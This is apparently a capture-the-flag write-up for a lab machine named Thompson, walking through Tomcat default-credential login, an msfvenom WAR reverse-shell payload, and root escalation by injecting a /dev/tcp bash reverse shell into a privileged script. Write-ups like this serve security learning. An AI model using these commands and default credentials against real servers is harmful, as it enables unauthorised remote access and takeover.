# CTF Writeup: Thompson

---

- Step 1: added <target_ip> to /etc/hosts & made nmap scan --> port 22, 8080 http, 8009 open
- Step 2: ran gobuster scan retrieved, didn't find any hidden dirs 
- Step 3: logged in with default tomcat creds --> tomcat:s3cret
- Step 4: tried to upload shell, but not working 
- Step 5: checked for potential exploitable cve's for tomcat version 8.5.5
- Step 6: tried to run ffuf for sub-domains, but also no results
- Step 7: researched and found out that u can craft .war payloads 
--> made msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.21.156.104 LPORT=1234 -f war -o shell.war
- Step 8: uploaded shell, started listener on local machine & clicked on /shell --> gained rce
- Step 9: retrieved user.txt in /home/jack dir. 
- Step 10: made echo "/bin/bash -i >& /dev/tcp/10.21.156.104/1234 0>&1" > id.sh --> since this script
runs with jack user privs and adds his input into test.txt which has root rights.
- Step 11: started listener and gained root rce --> retrieved root flag.

---

## Key Learnings

- Learned about msfvenom payload creation
- Learned about .war server side files
- Further strengthened enumeration knowledge
- Further strengthened priv esc knowledge
